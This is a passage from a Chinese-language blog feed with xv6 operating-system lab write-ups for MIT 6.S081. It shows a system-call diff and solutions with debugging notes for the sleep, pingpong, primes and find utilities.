unchanged"> </span><span class="token line">return 0;</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span></span>\ No newline at end of filediff --git a/user/user.h b/user/user.hindex 16107d6..37d15a5 100644<span class="token coord">--- a/user/user.h</span><span class="token coord">+++ b/user/user.h</span><span class="token coord">@@ -1,5 +1,6 @@</span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">struct stat;</span><span class="token prefix unchanged"> </span><span class="token line">struct rtcdate;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">struct sysinfo; // here</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">// system calls</span><span class="token prefix unchanged"> </span><span class="token line">int fork(void);</span></span>@@ -24,6 +25,7 @@ char* sbrk(int);<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">int sleep(int);</span><span class="token prefix unchanged"> </span><span class="token line">int uptime(void);</span><span class="token prefix unchanged"> </span><span class="token line">int trace(int); // here</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">int sysinfo(struct sysinfo *);</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">// ulib.c</span><span class="token prefix unchanged"> </span><span class="token line">int stat(const char*, struct stat*);</span></span>diff --git a/user/usys.pl b/user/usys.plindex 76c64ec..fde7c87 100755<span class="token coord">--- a/user/usys.pl</span><span class="token coord">+++ b/user/usys.pl</span>@@ -36,4 +36,5 @@ entry("getpid");<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">entry("sbrk");</span><span class="token prefix unchanged"> </span><span class="token line">entry("sleep");</span><span class="token prefix unchanged"> </span><span class="token line">entry("uptime");</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">entry("trace"); # here</span></span>\ No newline at end of file<span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">entry("trace"); # here</span><span class="token prefix inserted">+</span><span class="token line">entry("sysinfo")</span></span>\ No newline at end of file</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;xv6系统调用实现&quot;&gt;&lt;a href=&quot;#xv6系统调用实现&quot; class=&quot;headerlink&quot; title=&quot;xv6系统调用实现&quot;&gt;&lt;/a&gt;xv6系统调用实现&lt;/h1&gt;&lt;p&gt;不同于 Lab1 利用已实现的系统调用来实现一些用户态下的命令行程序，本 Lab 是</summary>
      
    
    
    
    <category term="操作系统" scheme="http://lordaeronesz.github.io/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    
    <category term="经验" scheme="http://lordaeronesz.github.io/tags/%E7%BB%8F%E9%AA%8C/"/>
    
    <category term="操作系统" scheme="http://lordaeronesz.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="xv6" scheme="http://lordaeronesz.github.io/tags/xv6/"/>
    
  </entry>
  
  <entry>
    <title>MIT6.s081 2021 Lab Utilities</title>
    <link href="http://lordaeronesz.github.io/2024/06/24/MIT6.s081-2021-Lab%20Utilities/"/>
    <id>http://lordaeronesz.github.io/2024/06/24/MIT6.s081-2021-Lab%20Utilities/</id>
    <published>2024-06-24T12:45:11.000Z</published>
    <updated>2024-06-26T02:10:33.161Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Boot-xv6"><a href="#Boot-xv6" class="headerlink" title="Boot xv6"></a>Boot xv6</h1><p>按照示例切换到 <code>util</code> 分支后，看到目录下包含 <code>Makefile</code> 文件，执行 <code>make qemu</code> 即可。</p><h1 id="sleep"><a href="#sleep" class="headerlink" title="sleep"></a>sleep</h1><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>借助系统调用 <code>sleep</code> 实现一个命令行程序，关键是要找到封装了系统调用的 C 函数的位置，根据提示：</p><blockquote><p>… <code>user/user.h</code> for the C definition of <code>sleep</code> callable from a user program …</p></blockquote><p>可知该函数的声明位于 <code>user.h</code> 头文件中，声明方式很简单：</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>将其“拷贝”（include）到需要编写的代码 <code>user/sleep.c</code> 中，调用 <code>sleep(&lt;睡眠时间&gt;)</code> 即可。</p><p>最后，按照提示，将编写的 <code>sleep</code> 代码添加到 Makefile 的 <code>UPROGS</code> 中，添加后如下所示：</p><pre class="language-makefile" data-language="makefile"><code class="language-makefile">UPROGS<span class="token operator">=</span>\    <span class="token variable">$U/_cat\</span>    <span class="token variable">$U/_echo\</span>    <span class="token variable">$U/_forktest\</span>    <span class="token variable">$U/_grep\</span>    <span class="token variable">$U/_init\</span>    <span class="token variable">$U/_kill\</span>    <span class="token variable">$U/_ln\</span>    <span class="token variable">$U/_ls\</span>    <span class="token variable">$U/_mkdir\</span>    <span class="token variable">$U/_rm\</span>    <span class="token variable">$U/_sh\</span>    <span class="token variable">$U/_stressfs\</span>    <span class="token variable">$U/_usertests\</span>    <span class="token variable">$U/_grind\</span>    <span class="token variable">$U/_wc\</span>    <span class="token variable">$U/_zombie\</span>    <span class="token variable">$U/_sleep\</span></code></pre><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token comment">// user/sleep.c</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"kernel/types.h"</span> <span class="token comment">// 注意先包含types.h</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"user/user.h"</span>    <span class="token comment">// 再包含user.h（user.h中存在在types.h中定义的别名）</span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>argc <span class="token operator">!=</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">"sleep: argument count error\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">int</span> time <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">sleep</span><span class="token punctuation">(</span>time<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h1 id="pingpong"><a href="#pingpong" class="headerlink" title="pingpong"></a>pingpong</h1><h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><p>本题主要是要理解管道的接口设计，以及借助该接口实现父进程与子进程之间的通信。这是 <code>xv6</code> 文档中对于 <code>pipe</code> 调用的描述：</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">pipe</span><span class="token punctuation">(</span><span class="token keyword">int</span> p<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment">// Create a pipe, put read/write file descriptors in p[0] and p[1].</span></code></pre><p><code>pipe</code> 创建一个管道，并分别将该管道的读、写端文件描述符置为 <code>p[0]</code> 和 <code>p[1]</code>，之后调用 <code>fork</code> 创建一个子进程，由于 <code>fork</code> 的作用是将父进程的数据直接拷贝给子进程，因此子进程同时继承了父进程的管道文件描述符，可以借助该文件描述符进行进程间通信（IPC），相当于借助一个共享文件进行通信，只不过该“文件”存储在内存的内核区域中，而不占用实际的磁盘存储空间。</p><p>利用管道解决本题的基本流程如下，首先需要创建两个管道 pa 和 pb，然后：</p><ol><li>父进程向管道 pa 的写端写入 1 字节数据，然后关闭 pa 的写端。</li><li>子进程从管道 pa 的读端读取 1 字节数据，然后关闭 pa 的读端，打印信息，然后向管道 pb 的写端写入 1 字节数据，关闭 pb 的写端。</li><li>父进程从管道 pb 的读端读取 1 字节数据，关闭 pb 的读端，最后打印信息。</li></ol><p>这里需要解释一下为什么需要两个管道（只是<strong>个人的方法</strong>，其它方法可能只需要一个管道），由于进程调度策略的影响，父进程和子进程的执行顺序并不确定。可能出现这样一种情况：在 <code>fork</code> 创建子进程后，父进程先被调度，将 1 字节数据写入管道，这时理想的情况是子进程被调度，然后读取父进程发送的数据，但是事实可能并不会如我们所愿，子进程可能一直得不到调度，父进程继续向下执行，从管道中读取自己刚刚发送的 1 字节的数据，这样子进程就无法收到父进程发送的数据，父子进程之间的通信也就失败了。</p><p>通过创建两个管道，并分别关闭对应的读端和写端，就能够得到两个单向数据流的管道，也就不会有上述自己写入的数据被被自己读取的情况出现。</p><h2 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token comment">// user/pingpong.c</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"kernel/types.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"user/user.h"</span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> pa<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> pb<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">pipe</span><span class="token punctuation">(</span>pa<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">pipe</span><span class="token punctuation">(</span>pb<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> pid <span class="token operator">=</span> <span class="token function">fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>pid <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">close</span><span class="token punctuation">(</span>pa<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">close</span><span class="token punctuation">(</span>pb<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// phase_2</span><span class="token function">read</span><span class="token punctuation">(</span>pa<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">close</span><span class="token punctuation">(</span>pa<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d: received ping\n"</span><span class="token punctuation">,</span> <span class="token function">getpid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">write</span><span class="token punctuation">(</span>pb<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"a"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">close</span><span class="token punctuation">(</span>pb<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>pid <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">close</span><span class="token punctuation">(</span>pa<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">close</span><span class="token punctuation">(</span>pb<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// phase_1</span><span class="token function">write</span><span class="token punctuation">(</span>pa<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"a"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">close</span><span class="token punctuation">(</span>pa<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// phase_3</span><span class="token function">read</span><span class="token punctuation">(</span>pb<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">close</span><span class="token punctuation">(</span>pb<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d: received pong\n"</span><span class="token punctuation">,</span> <span class="token function">getpid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">"pingpong: fork failed\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h1 id="primes"><a href="#primes" class="headerlink" title="primes"></a>primes</h1><h2 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h2><p>实现一个基于管道的并发埃式筛（The sieve of Eratosthenes），关键是要理解管道的机制，以及仔细阅读题干给出的<a href="https://swtch.com/~rsc/thread/">文章</a>，该文章有关该埃式筛方法的介绍图片如下所示：</p><p><img src="/2024/06/24/MIT6.s081-2021-Lab%20Utilities/primes.png"></p><p>该算法的个人感觉十分精妙，以下是基本流程：</p><ol><li>进程 0（主进程）发出一系列从 2 开始的整数序列。</li><li>进程 1 首先接收来自进程 0 发出的第一个整数 prime，prime 一定是一个质数，将其打印出来。然后继续按顺序接收来自进程 0 发出的其它整数，若接收到的某个整数能够被 prime 整除，则丢弃它（不做处理），否则将该整数发送给下一个进程。</li><li>后续进程的操作与进程 1 类似，直到没有任何整数发送给下一个进程，程序终止。</li></ol><p>算法的思路并不复杂，主要问题在于如何使用管道实现上述流程中进程 i 与进程 i + 1 之间的通信。我这里只使用了一个 <code>int[2]</code> 来轮换地存放管道的文件描述符，并使用一个缓冲区来暂存每次要发送给下一个进程的数，在一个进程完成它所做的工作后，再将缓冲区中的数据批量写入管道，并创建子进程来完成接下来的工作。这里要千万注意管道完成读取或写入后及时关闭，否则可能会出现子进程读取管道时阻塞的情况。</p><p>我在写下这篇博客的过程中发现，虽然我使用的这个方法能够达到预期的效果，并成功通过测试用例，但是其实是有一定问题的：本方法的处理过程是串行的。事实上，每个进程都是在将本进程的所有工作全部完成之后，再调用 <code>fork</code> 来创建子进程，完成后续的工作，本质上与放在一个进程中完成所有工作并没有区别，与文章中提到的 “<em>Concurrent</em>” 完全相悖。理想的做法应该是创建一个 <code>int[2]</code> 数组来存放管道的文件描述符，并及时 <code>fork</code> 子进程来工作，以此来实现并发，具体的代码实现有待后续改进。</p><h2 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token comment">// user/primes.c</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"kernel/types.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"user/user.h"</span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">int</span> p<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">pipe</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> buf<span class="token punctuation">;</span><span class="token keyword">int</span> plist<span class="token punctuation">[</span><span class="token number">35</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">35</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">write</span><span class="token punctuation">(</span>p<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>i<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">close</span><span class="token punctuation">(</span>p<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token function">read</span><span class="token punctuation">(</span>p<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">int</span> prime <span class="token operator">=</span> buf<span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"prime %d\n"</span><span class="token punctuation">,</span> prime<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> pcnt <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token function">read</span><span class="token punctuation">(</span>p<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>buf <span class="token operator">%</span> prime<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>plist<span class="token punctuation">[</span>pcnt<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> buf<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">close</span><span class="token punctuation">(</span>p<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">pipe</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// rotating pipe</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> pcnt<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">write</span><span class="token punctuation">(</span>p<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>plist <span class="token operator">+</span> i<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">close</span><span class="token punctuation">(</span>p<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> pid <span class="token operator">=</span> <span class="token function">fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>pid <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">continue</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>pid <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">wait</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">"primes: fork error\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h1 id="find"><a href="#find" class="headerlink" title="find"></a>find</h1><h2 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h2><p>本题是这个 Lab 中我花费时间最长的，代码思路虽然不算很复杂，但是有很多的细节问题我在写的时候没有考虑到，感觉 debug 时间差不多是 coding 的几倍了。。。</p><p>题目要求实现一个简易的 <code>find</code> 命令，根据提示可以参考 <code>user/ls.c</code> 对目录的读取操作，并使用递归来实现对子目录的查找。基本思路就是打开一个指定路径的文件（目录也算是特殊的文件），并根据文件的类型做不同处理：</p><ol><li>如果文件是常规文件，则判断改文件名是否是目标文件名（<code>find</code> 的第二个参数），如果是，则将其完整路径打印至标准输出。</li><li>如果文件是目录文件，则读取该目录下的所有文件名，并在该目录路径尾部加上 <code>/st.name</code>，依次构造一个新的文件名继续递归调用 <code>find</code>。注意不要递归进入 <code>.</code> 和 <code>..</code>，否则将导致无限递归。 </li></ol><p>以上便是基本思路，具体实现可以阅读完整代码，下面讲一下我遇到的一些问题（bug）：</p><ol><li>使用 <code>fstat</code> 获取文件信息时 <code>st.type</code> 始终为 3（<code>T_DEVICE</code> 类型）。</li></ol><p>这个问题其实挺难绷的，原因是我把 <code>if ((fd = open(path, 0)) &lt; 0)</code> 写成了 <code>if ((fd = open(path, 0) &lt; 0))</code>，因为 <code>&lt;</code> 的优先级大于 <code>=</code>，所以导致 <code>fd</code> 的值始终为 0 或 1（逻辑表达式的值只能为真或假），那么后续产生意想不到的结果也就不意外了。。。</p><ol start="2"><li>出现 <code>find: cannot open file ./sh</code> ，之后所有文件均打开失败</li></ol><p>在打印出文件描述符的值后，问题的起因比较明显了。</p><p><img src="/2024/06/24/MIT6.s081-2021-Lab%20Utilities/fd.png"></p><p>文件描述符一直在增大，最终文件打开失败，<code>open</code> 返回 -1。很明显，是因为文件在打开后没有及时关闭，并释放文件描述符，最终文件描述符被全部占用，新的文件无法再被打开。这也解释了既然程序退出后，所有打开的文件会自动关闭，为什么还要建议手动关闭文件的问题。</p><ol start="3"><li>读取到空文件名</li></ol><p>前面的问题解决之后，我发现程序仍然会出现无限递归搜索的情况（如下图所示），按理说我已经对文件名进行了判断，如果是 <code>.</code> 或者 <code>..</code> 则不做处理。</p><p><img src="/2024/06/24/MIT6.s081-2021-Lab%20Utilities/recur.png"></p><p>尝试打印文件名之后，我发现目录的最后一个文件名为空，这样的空文件名将导致程序不断往其末尾追加斜杠 <code>/</code> 而并没有递归进入该目录中。</p><p><img src="/2024/06/24/MIT6.s081-2021-Lab%20Utilities/bfg.png"></p><p>事实上，使用 <code>read</code> 读取目录时，在读取目录的所有条目之后，会返回一个空的 <code>dirent</code> 结构体，此时 <code>de.name</code> 为空，作为循环结束的标志。其实 <code>user/ls.c</code> 有针对这个特性的判断，不过当时 coding 的时候没有细看。所以正如 Lab guidance 中所说：</p><blockquote><p>Only when you have a firm grasp of the assignment and solution, then start coding.</p></blockquote><h2 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token comment">// user/find.c</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"kernel/types.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"kernel/stat.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"kernel/fs.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"user/user.h"</span></span><span class="token keyword">char</span><span class="token operator">*</span> <span class="token function">file_name</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> path<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">char</span><span class="token operator">*</span> p<span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span>p <span class="token operator">=</span> path <span class="token operator">+</span> <span class="token function">strlen</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">;</span> p <span class="token operator">>=</span> path <span class="token operator">&amp;&amp;</span> <span class="token operator">*</span>p <span class="token operator">!=</span> <span class="token string">'/'</span><span class="token punctuation">;</span> <span class="token operator">--</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">++</span>p<span class="token punctuation">;</span><span class="token keyword">return</span> p<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">find</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> path<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> target<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">int</span> fd<span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">dirent</span> de<span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">stat</span> st<span class="token punctuation">;</span><span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">512</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">char</span><span class="token operator">*</span> name<span class="token punctuation">,</span> <span class="token operator">*</span> p<span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">"find: cannot open file %s\n"</span><span class="token punctuation">,</span> path<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">fstat</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> <span class="token operator">&amp;</span>st<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">"find: cannot stat file %s\n"</span><span class="token punctuation">,</span> path<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">switch</span> <span class="token punctuation">(</span>st<span class="token punctuation">.</span>type<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">case</span> T_FILE<span class="token operator">:</span>name <span class="token operator">=</span> <span class="token function">file_name</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token 